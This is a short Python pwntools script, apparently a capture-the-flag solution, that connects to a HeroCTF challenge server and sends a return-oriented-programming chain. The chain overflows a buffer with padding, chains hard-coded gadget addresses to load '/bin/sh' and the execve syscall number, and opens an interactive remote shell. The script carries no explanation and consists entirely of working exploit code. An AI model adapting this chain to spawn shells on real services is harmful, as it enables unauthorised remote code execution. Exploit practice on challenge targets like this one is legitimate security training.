from pwn import *

p = remote("pwn.heroctf.fr",8000)

offset = b'yes' + 14 *b'a'

# pop rdi ; pop rsi ; pop rdx ; ret
pop_rdi_rsi_rdx_ret =  0x0000000000401222
bin_sh = 0x000000000404097
#0x0000000000401226 <+16>:	xchg   rdx,rax
xchg_rdx_rax = 0x0000000000401226
#0x00000000004011fd : pop rbp ; ret
pop_rbp_ret = 0x00000000004011fd
#pop_rsi_rdx_ret = 0x0000000000401223
pop_rsi_rdx = 0x0000000000401223

payload = offset
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(bin_sh)
payload += b'/bin/sh\x00'
payload += p64(0x3b)
payload += p64(xchg_rdx_rax)
payload += p64(0x000000000040121e)
payload += p64(pop_rsi_rdx)
payload += p64(0)
payload += p64(0)
payload += p64(0x0000000000401229)

print(len(payload))
p.sendline(payload)
p.interactive()